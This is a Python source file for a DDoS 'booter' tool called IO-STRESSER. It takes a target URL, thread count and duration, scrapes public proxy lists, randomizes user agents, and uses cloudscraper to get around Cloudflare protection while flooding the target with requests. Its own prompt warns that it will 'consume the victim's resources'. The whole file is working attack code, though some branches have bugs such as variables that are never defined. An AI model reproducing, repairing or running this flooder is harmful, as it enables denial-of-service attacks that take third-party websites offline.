import fake_useragent, cloudscraper, requests, random, time
from multiprocessing import Process
from lib.textColor import textGen

global R,B,C,G,Y,Q
R='\033[1;31m'; B='\033[1;34m'; C='\033[1;37m'; G='\033[1;32m'; Y='\033[1;33m'; Q='\033[1;36m'; LB = '\033[90m'

banner = '''
 ______                    _                  
|_   _ \                  / |_                
  | |_) |   .--.    .--. `| |-'.---.  _ .--.  
  |  __'. / .'`\ \/ .'`\ \| | / /__\\[ `/'`\] 
 _| |__) || \__. || \__. || |,| \__., | |     
|_______/  '.__.'  '.__.' \__/ '.__.'[___]    
'''

logo = textGen(banner)

base_user_agents = [
    'Mozilla/%.1f (Windows; U; Windows NT {0}; en-US; rv:%.1f.%.1f) Gecko/%d0%d Firefox/%.1f.%.1f'.format(random.uniform(5.0, 10.0)),
    'Mozilla/%.1f (Windows; U; Windows NT {0}; en-US; rv:%.1f.%.1f) Gecko/%d0%d Chrome/%.1f.%.1f'.format(random.uniform(5.0, 10.0)),
    'Mozilla/%.1f (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/%.1f.%.1f (KHTML, like Gecko) Version/%d.0.%d Safari/%.1f.%.1f',
    'Mozilla/%.1f (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/%.1f.%.1f (KHTML, like Gecko) Version/%d.0.%d Chrome/%.1f.%.1f',
    'Mozilla/%.1f (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/%.1f.%.1f (KHTML, like Gecko) Version/%d.0.%d Firefox/%.1f.%.1f',
]

def rand_ua():
    return random.choice(base_user_agents) % (random.random() + 5, random.random() + random.randint(1, 8), random.random(), random.randint(2000, 2100), random.randint(92215, 99999), (random.random() + random.randint(3, 9)), random.random())    

def remove_by_value(arr, val):
    return [item for item in arr if item != val]

def run(target, proxies, cfbp):
    if cfbp == 0 and len(proxies) > 0:
        proxy = random.choice(proxies)
        proxiedRequest = requests.Session()
        proxiedRequest.proxies = {'http': 'http://' + proxy}
        
        try:
            response = proxiedRequest.get(target, headers=headers)
            print('[%s%s%s] HTTP_PROXY'%(Y,response.status_code,C))

            if response.status_code >= 200 and response.status_code <= 226:
                for _ in range(100):
                    proxiedRequest.get(target, headers=headers)
            
            else:
                proxies = remove_by_value(proxies, proxy)
        
        except requests.RequestException as e:
            #print("Request Exception:", e)
            proxies = remove_by_value(proxies, proxy)

    elif cfbp == 1 and len(proxies) > 0:
        headers = {'User-Agent': rand_ua()}
        scraper = cloudscraper.create_scraper()
        scraper = cloudscraper.CloudScraper()
        
        proxy = random.choice(proxies)
        proxies = {'http': 'http://' + proxy}

        try:
            scraper.get(target, headers=headers, proxies=proxies, timeout=15)
            scraper.head(target, headers=headers, proxies=proxies, timeout=15)
            print("[%s-%s] Cloudflare BYPASS + PROXY"%(Y,C))
        except:
            pass
    
    else:
        headers = {'User-Agent': rand_ua()}
        scraper = cloudscraper.create_scraper()
        scraper = cloudscraper.CloudScraper()

        try:
            scraper.get(target, headers=headers, timeout=15)
            scraper.head(target, headers=headers, timeout=15)
            print("[%s-%s] Cloudflare BYPASS"%(Y,C))
        except:
            pass

def thread(target, proxies, cfbp):
    while True:
        run(target, proxies, cfbp)
        time.sleep(1)

def ioStresser():
    target = input('\33]0;Kusty🐀,  IO-STRESSER!🤬\a'+"%s\n%sWARNING%s: %sThis attack will use the power of your\n machine to consume the victim's resources.\n\n%sURL: https://example.com/%s\n\n%sUrl%s: "%(logo,R,C,Y,LB,C,B,C))
    times = int(input('%sTime%s: '%(B,C)))
    threads = int(input('%sThreads%s: '%(B,C)))
    attack_type = int(input('\n%sAttack Type%s\n\n[ %s1%s ] PROXY\n[ %s2%s ] CF BYPASS\n[ %s3%s ] CF BYPASS + PROXY\n%s\nInput%s: '%(Q,C,G,C,G,C,G,C,B,C)))

    proxies = []

    if attack_type == 1:
        print("\n[%s-%s] ATTACK HTTP_PROXY\n"%(Y,C))
        try:
            proxyscrape_http = requests.get('https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all')
            proxy_list_http = requests.get('https://www.proxy-list.download/api/v1/get?type=http')
            raw_github_http = requests.get('https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt')
            proxies = proxyscrape_http.text.replace('\r', '').split('\n')
            proxies += proxy_list_http.text.replace('\r', '').split('\n')
            proxies += raw_github_http.text.replace('\r', '').split('\n')
        except:
            pass
    
    elif attack_type == 2:
        print("\n[%s-%s] ATTACK BYPASS"%(Y,C))

    elif attack_type == 3:
        cfbp = 1
        try:
            proxyscrape_http = requests.get('https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all')
            proxy_list_http = requests.get('https://www.proxy-list.download/api/v1/get?type=http')
            raw_github_http = requests.get('https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt')
            proxies = proxyscrape_http.text.replace('\r', '').split('\n')
            proxies += proxy_list_http.text.replace('\r', '').split('\n')
            proxies += raw_github_http.text.replace('\r', '').split('\n')
        except:
            pass
    
    processes = []
    for _ in range(threads):
        p = Process(target=thread, args=(target, proxies, cfbp))
        processes.append(p)
        p.start()
        print(f"[{G}+{C}] IO-STRESSER THREAD: {_+1}")
    time.sleep(times)
    
    print('\n[%s!%s] Attack End'%(R,C))
    
    for p in processes:
        p.terminate()
